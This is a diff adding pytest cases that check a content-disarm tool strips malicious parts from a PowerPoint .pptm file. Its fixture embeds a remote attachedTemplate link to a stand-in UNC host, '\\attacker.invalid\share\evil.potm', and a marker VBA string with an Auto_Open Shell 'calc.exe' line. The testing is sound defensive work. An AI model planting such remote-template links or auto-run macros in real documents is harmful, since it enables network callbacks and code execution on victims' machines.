@@ -2440,6 +2440,112 @@ class TestOtherOfficeFormats:
         assert dest.endswith(".pptx"), f"expected pptx extension, got: {dest}"
 
 
+class TestPptxRemoteTemplateAndVba:
+    """Regression cover for the .pptm vector validated by hand in PowerPoint itself
+    (docs/viewer-validation/CHECKLIST.md, 2026-08-14): a presentation carrying BOTH a
+    vbaProject rel and an external attachedTemplate rel on ppt/_rels/presentation.xml.rels.
+
+    The docx form of the remote-template vector is covered in TestOfficeCDR; the pptx form
+    was only ever exercised by the standalone viewer-validation script, so nothing in the
+    suite would have caught a regression that scoped the attachedTemplate strip to Word.
+    The attachedTemplate half is the part a headless render cannot settle — LibreOffice
+    never attempts the remote fetch, so only PowerPoint could show it declines to reach
+    for the network. These tests hold the structural precondition for that result."""
+
+    TMPL_TYPE = ("http://schemas.openxmlformats.org/officeDocument/2006/"
+                 "relationships/attachedTemplate")
+    VBA_TYPE = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
+    # UNC rather than http: matches the hand-validated fixture, and .invalid is reserved
+    # (RFC 2606) so a regression that leaves the rel intact still cannot phone home.
+    TMPL_TARGET = r"\\attacker.invalid\share\evil.potm"
+
+    def _make_pptm(self) -> bytes:
+        ns = "http://schemas.openxmlformats.org/package/2006/relationships"
+        pres_rels = (
+            f'<?xml version="1.0"?><Relationships xmlns="{ns}">'
+            f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
+            f'officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>'
+            f'<Relationship Id="rId4" Type="{self.VBA_TYPE}" Target="vbaProject.bin"/>'
+            f'<Relationship Id="rId5" Type="{self.TMPL_TYPE}" '
+            f'Target="{self.TMPL_TARGET}" TargetMode="External"/>'
+            f'</Relationships>'
+        )
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("[Content_Types].xml",
+                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
+                       'package/2006/content-types">'
+                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
+                       'package.relationships+xml"/>'
+                       '<Override PartName="/ppt/presentation.xml" ContentType="application/'
+                       'vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>'
+                       '<Override PartName="/ppt/slides/slide1.xml" ContentType="application/'
+                       'vnd.openxmlformats-officedocument.presentationml.slide+xml"/>'
+                       '</Types>')
+            z.writestr("_rels/.rels", _minimal_rels())
+            z.writestr("ppt/_rels/presentation.xml.rels", pres_rels)
+            z.writestr("ppt/presentation.xml", "<p:presentation/>")
+            z.writestr("ppt/slides/slide1.xml",
+                       '<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"'
+                       '><a:t>CDR_TEST_SLIDE_TEXT</a:t></p:sld>')
+            z.writestr("ppt/vbaProject.bin",
+                       b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
+                       b'CDR_TEST_PPTX_VBA_MARKER Sub Auto_Open() Shell "calc.exe" End Sub')
+        return buf.getvalue()
+
+    def test_pptx_attached_template_rel_stripped(self):
+        """The remote-template rel must not survive — this is the PowerPoint-validated half."""
+        clean, report = cdr.cdr_office(self._make_pptm(), "pptm")
+        with zipfile.ZipFile(io.BytesIO(clean)) as z:
+            rels = z.read("ppt/_rels/presentation.xml.rels").decode()
+        assert "attachedTemplate" not in rels, \
+            "pptx attachedTemplate rel survived CDR — remote-template fetch still possible"
+        assert "attacker.invalid" not in rels, \
+            "remote-template target survived CDR"
+        assert any("attachedtemplate" in r.lower() for r in report["removed"]), \
+            "CDR report did not record the pptx attachedTemplate rel removal"
+
+    def test_pptx_vba_part_and_rel_both_removed(self):
+        """Dropping the part while leaving the rel dangling breaks the package (pitfall #21)."""
+        clean, _ = cdr.cdr_office(self._make_pptm(), "pptm")
+        with zipfile.ZipFile(io.BytesIO(clean)) as z:
+            names = [n.lower() for n in z.namelist()]
+            rels = z.read("ppt/_rels/presentation.xml.rels").decode()
+        assert not any("vbaproject.bin" in n for n in names), "ppt/vbaProject.bin survived"
+        assert "vbaProject" not in rels, "vbaProject rel dangles at a removed part"
+
+    def test_pptm_threat_markers_absent_from_decompressed_entries(self):
+        """Scan DECOMPRESSED entries — a raw-byte grep over a deflated OOXML package
+        reports every marker absent, which reads exactly like a clean result."""
+        src = self._make_pptm()
+        markers = [b"CDR_TEST_PPTX_VBA_MARKER", b"Auto_Open", b"calc.exe",
+                   b"attacker.invalid"]
+
+        def present(data: bytes) -> set[bytes]:
+            found = set()
+            with zipfile.ZipFile(io.BytesIO(data)) as z:
+                for n in z.namelist():
+                    body = z.read(n)
+                    found |= {m for m in markers if m in body}
+            return found
+
+        # Positive control: every marker is genuinely present on the way in, so a green
+        # result below cannot be a silently broken probe.
+        assert present(src) == set(markers), \
+            f"fixture is defective — expected all markers, found {present(src)}"
+
+        clean, _ = cdr.cdr_office(src, "pptm")
+        assert present(clean) == set(), f"threat markers survived CDR: {present(clean)}"
+
+    def test_pptm_slide_text_preserved(self):
+        """Fidelity: disarming must not gut the slide body."""
+        clean, _ = cdr.cdr_office(self._make_pptm(), "pptm")
+        with zipfile.ZipFile(io.BytesIO(clean)) as z:
+            assert "ppt/slides/slide1.xml" in z.namelist(), "slide part was dropped"
+            assert b"CDR_TEST_SLIDE_TEXT" in z.read("ppt/slides/slide1.xml"), \
+                "slide text lost — over-stripping"
+
+
 class TestRemainingOfficeFormats:
     """CDR on the 7 untested Office formats: dotx, xltx, xltm, xlam, potx, potm, ppsx.
     Each test verifies: VBA stripped, no macro content type survives, extension remap
